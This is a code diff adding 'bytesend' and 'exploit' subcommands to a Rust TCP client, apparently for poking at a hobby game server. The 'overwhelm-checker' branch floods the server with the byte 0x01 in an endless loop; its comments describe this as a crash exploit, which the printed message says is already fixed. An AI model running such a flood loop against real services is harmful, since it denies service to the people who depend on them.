@@ -35,9 +35,28 @@ fn main() {
                 let string = std::env::args().nth(2).unwrap(); // for readability purposes only
                 server_connection.write(&string.into_bytes()).unwrap();
             },
+            "bytesend" => {
+                let string = std::env::args().nth(2).unwrap(); // for readability purposes only
+                println!("{:?}", hex::decode(&string).expect("failed to decode hex"));
+                server_connection.write(&hex::decode(&string).expect("failed to decode hex")).unwrap();
+            },
+            "exploit" => {
+                match std::env::args().nth(2).unwrap().as_str() {
+                    "overwhelm-checker" => {
+                        // alpha sus server exploit to crash the server
+                        // - is intended to panic with a connection reset after server crashes
+                        println!("[!] this exploit has been fixed");
+                        loop {
+                            server_connection.write(&"\x01".to_string().into_bytes()).unwrap();
+                        }
+                    },
+                    _ => panic!(),
+                }
+            }
             _ => panic!("no args"),
         }
     } else {
         println!("failed");
     }
+
 }
